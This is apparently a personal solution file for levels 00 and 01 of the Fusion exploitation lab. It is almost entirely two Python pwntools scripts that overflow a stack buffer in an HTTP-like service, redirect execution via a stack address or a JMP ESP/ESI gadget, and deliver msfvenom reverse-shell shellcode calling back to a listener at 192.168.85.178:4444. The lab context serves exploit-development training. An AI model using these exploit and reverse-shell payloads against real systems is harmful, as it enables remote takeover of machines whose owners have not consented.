# Fusion

## Level00

[http://exploit-exercises.lains.space/fusion/level00/](http://exploit-exercises.lains.space/fusion/level00/)

1. Get offset to modify EIP
2. Put shellcode address in EIP

```python
from pwn import *

r = remote("192.168.85.181", 20000)

buf = "GET "            # Needed
buf += "A"*139          # Offset 139
buf += p32(0xbffff440)  # Stack address where the shellcode will be saved
buf += " HTTP/1.1"      # Needed
buf += "\x90"*100       # NOPs

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.85.178 LPORT=4444 -a x86 --platform linux -b '\x00\x2f' -f python
buf += "\xdb\xda\xb8\x3b\x50\xff\x66\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x12\x31\x42\x17\x83\xea\xfc\x03\x79\x43\x1d"
buf += "\x93\x4c\xb8\x16\xbf\xfd\x7d\x8a\x2a\x03\x0b\xcd\x1b"
buf += "\x65\xc6\x8e\xcf\x30\x68\xb1\x22\x42\xc1\xb7\x45\x2a"
buf += "\x12\xef\xe3\x18\xfa\xf2\x0b\x4d\xa7\x7b\xea\xdd\x31"
buf += "\x2c\xbc\x4e\x0d\xcf\xb7\x91\xbc\x50\x95\x39\x51\x7e"
buf += "\x69\xd1\xc5\xaf\xa2\x43\x7f\x39\x5f\xd1\x2c\xb0\x41"
buf += "\x65\xd9\x0f\x01"

r.recvline()
r.send(buf)
r.interactive()
```

## Level01

```python
from pwn import *

r = remote("192.168.85.181", 20001)

buf = "GET "            # Needed
buf += "A"*139          # Offset 139
buf += p32(0x08049f4f)  # Adress of: JMP esp
buf += p32(0x9090E6FF)  # OPCODE: JMP esi (the esi register have the address of the shellcode)
buf += " HTTP/1.1"      # Needed
buf += "\x90"*100       # NOPs

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.85.178 LPORT=4444 -a x86 --platform linux -b '\x00\x2f' -f python
buf += "\xdb\xda\xb8\x3b\x50\xff\x66\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x12\x31\x42\x17\x83\xea\xfc\x03\x79\x43\x1d"
buf += "\x93\x4c\xb8\x16\xbf\xfd\x7d\x8a\x2a\x03\x0b\xcd\x1b"
buf += "\x65\xc6\x8e\xcf\x30\x68\xb1\x22\x42\xc1\xb7\x45\x2a"
buf += "\x12\xef\xe3\x18\xfa\xf2\x0b\x4d\xa7\x7b\xea\xdd\x31"
buf += "\x2c\xbc\x4e\x0d\xcf\xb7\x91\xbc\x50\x95\x39\x51\x7e"
buf += "\x69\xd1\xc5\xaf\xa2\x43\x7f\x39\x5f\xd1\x2c\xb0\x41"
buf += "\x65\xd9\x0f\x01"

r.send(buf)
r.interactive()
```

